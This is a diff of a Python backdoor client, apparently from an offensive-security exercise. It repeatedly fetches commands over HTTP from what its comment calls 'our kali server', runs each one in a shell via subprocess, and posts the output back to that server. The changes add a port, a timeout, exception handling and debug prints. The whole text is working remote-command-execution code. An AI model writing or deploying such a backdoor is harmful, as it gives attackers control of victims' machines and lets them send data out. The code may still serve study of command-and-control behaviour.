@@ -12,15 +12,24 @@ import time
 
 while True: 
 
-    req = requests.get('http://127.0.0.1') # Send GET request to our kali server
-    command = req.text # Store the received txt into command variable
+    try:
+        req = requests.get('http://127.0.0.1:60080', timeout=1) # Send GET request to our kali server
+        command = req.text # Store the received txt into command variable
+        # no output in git shell, use cmd.exe !!
+        print(command)
 
-    if 'terminate' in command:
-        break 
+        if 'terminate' in command:
+            break 
 
-    else:
-        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        post_response = requests.post(url='http://127.0.0.1', data=CMD.stdout.read() ) # POST the result 
-        post_response = requests.post(url='http://127.0.0.1', data=CMD.stderr.read() ) # or the error -if any-
+        else:
+            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            s = CMD.stdout.read()
+            print(s)
+            post_response = requests.post(url='http://127.0.0.1:60080', data= s) # POST the result 
+            # post_response = requests.post(url='http://127.0.0.1:60080', data=CMD.stderr.read() ) # or the error -if any-
+
+    except Exception as ex:
+        # no output in git shell, use cmd.exe !!
+        print("exception " + str(ex) + "\r")
 
     time.sleep(3)
